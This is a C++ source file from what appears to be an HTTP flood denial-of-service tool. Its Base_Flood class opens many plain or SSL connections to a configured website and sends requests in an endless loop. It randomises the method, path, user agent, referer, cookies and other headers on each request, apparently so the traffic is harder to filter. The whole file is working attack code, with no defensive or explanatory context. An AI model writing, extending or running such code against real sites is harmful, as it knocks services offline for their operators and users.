#include <vector>
#include <memory>

#include "../Headers/Base_Flood.hpp"
#include "../Headers/Socket.hpp"
#include "../Headers/Secure_Socket.hpp"
#include "../Headers/Randomizer.hpp"

Base_Flood::Base_Flood(std::shared_ptr<Config> config) : Attack_Vector(std::move(config)){

}

void Base_Flood::attack(){
  std::vector<std::unique_ptr<Socket>> sockets{};
  sockets.reserve(config->CONNECTIONS);
  Socket::Host host{config->website, config->port};
  httphdr httph{};
  for(size_t i = 0; i < sockets.capacity(); ++i){
    if(config->UseSSL)
      sockets.emplace_back(std::make_unique<Secure_Socket>(host, static_cast<Socket::Protocol>(config->protocol)));
    else
    	sockets.emplace_back(std::make_unique<Socket>(host, static_cast<Socket::Protocol>(config->protocol)));
  }

  while(true){
    for(auto& sock : sockets){
      init_header(httph);
      sock->Write(httph.get());
    }
  }

}

void Base_Flood::init_header(httphdr &httph){
  Randomizer::random_method(httph.method);
  if(config->RandomizeHeader)
    Randomizer::randomstr(httph.path);
  Randomizer::random_useragent(*(config->useragents), httph.useragent);
  Randomizer::random_caching(httph.cache_control);
  Randomizer::random_encoding(httph.encoding);
  Randomizer::random_charset(httph.charset[0]);
  Randomizer::random_charset(httph.charset[1]);
  Randomizer::random_referer(httph.referer);
  httph.accept = "*/*";
  httph.connection_type = "Keep-Alive";
  Randomizer::random_contenttype(httph.content_type);
  Randomizer::randomstr(httph.cookie[0]);
  Randomizer::randomstr(httph.cookie[1]);
  httph.keep_alive = Randomizer::randomInt(1, 5000);
  httph.DNT = Randomizer::randomInt(0, 1);
  httph.generate();
}
